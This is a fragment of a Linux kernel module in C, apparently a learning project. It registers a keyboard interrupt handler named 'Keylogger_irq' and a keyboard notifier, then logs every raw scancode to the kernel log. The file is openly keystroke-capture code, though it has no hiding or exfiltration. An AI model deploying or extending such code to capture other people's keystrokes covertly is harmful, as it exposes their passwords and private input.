#include "keyboard.h"
#include "logger.h"

#define KBD_IRQ 1


void keyboard_init_released(void)
{
	for (int i = 0; i < 256; ++i) {
		if (press_keys_set_1[i].keycode != 0) {
			uint8_t keycode = (i | 0x80);
			keyboard_key_t *key = &release_keys_set_1[keycode];
			key->value = press_keys_set_1[i].value;
			key->name = press_keys_set_1[i].name;
			key->keycode = keycode;
			key->status = RELEASE;

		}
	}
}

irqreturn_t keyboard_handler(int irq, void *dev_id)
{
	if (inb(0x64) & 0x01) {          										// read status
		uint8_t keycode = inb(0x60); 										// read data
		pr_info("keycode : %x\n", keycode);
		// if (release_keys[keycode].keycode != 0) {
		// 	printk(KERN_ALERT "Key number %d pressed\n", keycode);
		// } else if (release_keys[keycode].keycode != 0) {
		// 	printk(KERN_ALERT "Key number %d pressed\n", keycode);
		// } else {
		// 	printk(KERN_ALERT "Current layout did not handle the keycode number %x\n", keycode);		
		// }
	}
	return IRQ_HANDLED;
}

int	keyboard_init(void)
{
	keyboard_init_released();
	register_keyboard_notifier(&keyboard_nb);
	int status = request_irq(KBD_IRQ, keyboard_handler, IRQF_SHARED, "Keylogger_irq", &my_misc);
	if (status) {
		printk(KERN_ALERT "Error: irq register failed\n");
		return -status;
	}
	printk(KERN_INFO "Misc Device Registred at /dev/Keylogger_irq\n");
	return status;
}

EXPORT_SYMBOL(keyboard_init);
